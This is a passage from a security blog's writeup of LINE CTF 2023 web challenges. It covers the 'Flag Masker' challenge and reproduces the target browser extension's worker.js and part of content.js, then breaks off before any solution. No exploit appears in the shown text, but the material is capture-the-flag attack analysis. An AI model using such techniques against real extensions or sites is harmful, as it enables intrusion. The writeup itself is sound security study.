<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>LINE CTF 2023 Notes - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


<link href="https://blog.huli.tw/2023/03/27/en/linectf-2023-writeup/" rel="alternate" hreflang="en" />


<link href="https://blog.huli.tw/2023/03/27/linectf-2023-writeup/" rel="alternate" hreflang="x-default" />


<link href="https://blog.huli.tw/2023/03/27/linectf-2023-writeup/" rel="alternate" hreflang="zh-TW" />
    




    
<link rel="canonical" href="https://blog.huli.tw/2023/03/27/en/linectf-2023-writeup/">
    





    <meta name="description" content="This year, Water Paddler got second place, solving 8 out of 9 web challenges (I contributed to 2 of them). Overall, I think the web challenges were easier than last year, and there were fewer particip">
<meta property="og:type" content="article">
<meta property="og:title" content="LINE CTF 2023 Notes">
<meta property="og:url" content="https://blog.huli.tw/2023/03/27/en/linectf-2023-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="This year, Water Paddler got second place, solving 8 out of 9 web challenges (I contributed to 2 of them). Overall, I think the web challenges were easier than last year, and there were fewer particip">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/linectf-2023-writeup/cover-en.png">
<meta property="article:published_time" content="2023-03-27T00:10:44.000Z">
<meta property="article:modified_time" content="2023-06-20T05:10:49.067Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/linectf-2023-writeup/cover-en.png">



<link rel="alternative" href="/atom.xml" title="LINE CTF 2023 Notes" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#flag-masker-9-solves">1&nbsp;&nbsp;<b>Flag Masker (9 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#another-secure-store-note-7-solves">2&nbsp;&nbsp;<b>Another Secure Store Note (7 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#momomomomemomemo-3-solves">3&nbsp;&nbsp;<b>Momomomomemomemo (3 solves)</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2023/03/27/linectf-2023-writeup/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            LINE CTF 2023 Notes
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2023-03-27T00:10:44.000Z" itemprop="datePublished">27 March 2023</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>This year, Water Paddler got second place, solving 8 out of 9 web challenges (I contributed to 2 of them). Overall, I think the web challenges were easier than last year, and there were fewer participants.</p>
<p>Recently, I noticed that I haven’t been writing as many writeups as before. One reason is that I’ve been busy, and the other reason is that there haven’t been as many interesting challenges (client-side) lately. Or maybe my teammates have become stronger, and they solve the challenges before I even get a chance to look at them. So, I’ve been too lazy to write notes XD</p>
<p>In this post, I’ll only write about the challenges that I participated in or found interesting. I’ll skip the others.</p>
<span id="more"></span>

<h2><span id="flag-masker-9-solves">Flag Masker (9 solves)</span></h2><p>The backend code for this challenge was simple. It allowed you to create a note, and the output was secure, with no risk of XSS.</p>
<p>The interesting part was that an admin bot had an extension that had obfuscated code, but fortunately, it was short. Here’s the <code>worker.js</code> code:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token string">"use strict"</span><span class="token punctuation">;</span>
  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Flag Master - worker script is loaded."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token function-variable function">e</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e<span class="token punctuation">,</span> n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> n<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e<span class="token punctuation">,</span> r<span class="token punctuation">,</span> a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        n <span class="token operator">=</span> n<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n <span class="token operator">+=</span> <span class="token string">"\x3c!--DETECTED FLAGS ARE MASKED BY EXTENSION--\x3e"</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    chrome<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>onMessage<span class="token punctuation">.</span><span class="token function">addListener</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">n<span class="token punctuation">,</span> r<span class="token punctuation">,</span> a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">var</span> t <span class="token operator">=</span> n<span class="token punctuation">.</span>regex <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>regex<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">"LINECTF\\&#123;(.+)\\&#125;"</span><span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">!</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e<span class="token punctuation">,</span> n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> r <span class="token operator">=</span> n<span class="token punctuation">.</span>head<span class="token punctuation">,</span>
          a <span class="token operator">=</span> n<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>r <span class="token operator">+</span> a<span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">head</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
        <span class="token literal-property property">flag</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token number">1</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">head</span><span class="token operator">:</span> <span class="token function">e</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> n<span class="token punctuation">.</span>head<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token function">e</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> n<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token literal-property property">flag</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token number">0</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After receiving a message, it replaces the content on the screen based on the received regular expression and then sends it back.</p>
<p>Here’s the <code>content.js</code> code:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
      <span class="token number">576</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> r<span class="token punctuation">,</span> e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> a<span class="token punctuation">,</span> n<span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">===</span> <span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token string">"function"</span> <span class="token operator">==</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span><span class="token function-variable function">a</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">"href"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">img</span><span class="token operator">:</span> <span class="token string">"src"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">form</span><span class="token operator">:</span> <span class="token string">"action"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">base</span><span class="token operator">:</span> <span class="token string">"href"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">script</span><span class="token operator">:</span> <span class="token string">"src"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">iframe</span><span class="token operator">:</span> <span class="token string">"src"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">link</span><span class="token operator">:</span> <span class="token string">"href"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">embed</span><span class="token operator">:</span> <span class="token string">"src"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">object</span><span class="token operator">:</span> <span class="token string">"data"</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token punctuation">,</span> <span class="token string">"protocol"</span><span class="token punctuation">,</span> <span class="token string">"authority"</span><span class="token punctuation">,</span> <span class="token string">"userInfo"</span><span class="token punctuation">,</span> <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token string">"host"</span><span class="token punctuation">,</span> <span class="token string">"port"</span><span class="token punctuation">,</span> <span class="token string">"relative"</span><span class="token punctuation">,</span> <span class="token string">"path"</span><span class="token punctuation">,</span> <span class="token string">"directory"</span><span class="token punctuation">,</span> <span class="token string">"file"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> <span class="token string">"fragment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            e <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">anchor</span><span class="token operator">:</span> <span class="token string">"fragment"</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            a <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">strict</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
              <span class="token literal-property property">loose</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)</span><span class="token regex-delimiter">/</span></span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            n <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[0-9]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>

          <span class="token keyword">function</span> <span class="token function">o</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span> o <span class="token operator">=</span> a<span class="token punctuation">[</span>e <span class="token operator">?</span> <span class="token string">"strict"</span> <span class="token operator">:</span> <span class="token string">"loose"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                <span class="token literal-property property">attr</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token literal-property property">param</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token literal-property property">seg</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> s <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span> s<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">)</span> i<span class="token punctuation">.</span>attr<span class="token punctuation">[</span>r<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> o<span class="token punctuation">[</span>s<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> i<span class="token punctuation">.</span>param<span class="token punctuation">.</span>query <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">.</span>param<span class="token punctuation">.</span>fragment <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>fragment<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">.</span>seg<span class="token punctuation">.</span>path <span class="token operator">=</span> i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^\/+|\/+$</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">.</span>seg<span class="token punctuation">.</span>fragment <span class="token operator">=</span> i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>fragment<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^\/+|\/+$</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>base <span class="token operator">=</span> i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>host <span class="token operator">?</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>protocol <span class="token operator">?</span> i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>protocol <span class="token operator">+</span> <span class="token string">"://"</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>host <span class="token operator">:</span> i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>host<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>port <span class="token operator">?</span> <span class="token string">":"</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>port <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span> i
          <span class="token punctuation">&#125;</span>

          <span class="token keyword">function</span> <span class="token function">i</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> r</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> t<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> t<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> a <span class="token keyword">in</span> t<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> e<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> t<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">,</span> e
          <span class="token punctuation">&#125;</span>

          <span class="token keyword">function</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> r<span class="token punctuation">,</span> e<span class="token punctuation">,</span> a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">var</span> o <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">var</span> u <span class="token operator">=</span> r<span class="token punctuation">[</span>e<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>e<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
              <span class="token string">"]"</span> <span class="token operator">==</span> o <span class="token operator">?</span> <span class="token function">c</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">!==</span> a <span class="token operator">&amp;&amp;</span> u<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">"object"</span> <span class="token operator">==</span> <span class="token keyword">typeof</span> u <span class="token operator">?</span> u<span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> e <span class="token keyword">in</span> t<span class="token punctuation">)</span> t<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> r<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> r
              <span class="token punctuation">&#125;</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">:</span> u <span class="token operator">=</span> r<span class="token punctuation">[</span>e<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>r<span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token operator">~</span>o<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"]"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>o <span class="token operator">=</span> o<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> o<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">!</span>n<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">c</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>u <span class="token operator">=</span> <span class="token function">i</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> u<span class="token punctuation">,</span> o<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">c</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>u <span class="token operator">=</span> <span class="token function">i</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> u<span class="token punctuation">,</span> o<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token function">c</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> r<span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">"object"</span> <span class="token operator">==</span> <span class="token keyword">typeof</span> r<span class="token punctuation">[</span>e<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">===</span> r<span class="token punctuation">[</span>e<span class="token punctuation">]</span> <span class="token operator">?</span> r<span class="token punctuation">[</span>e<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">:</span> r<span class="token punctuation">[</span>e<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>r<span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">]</span>
          <span class="token punctuation">&#125;</span>

          <span class="token keyword">function</span> <span class="token function">u</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> r<span class="token punctuation">,</span> e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
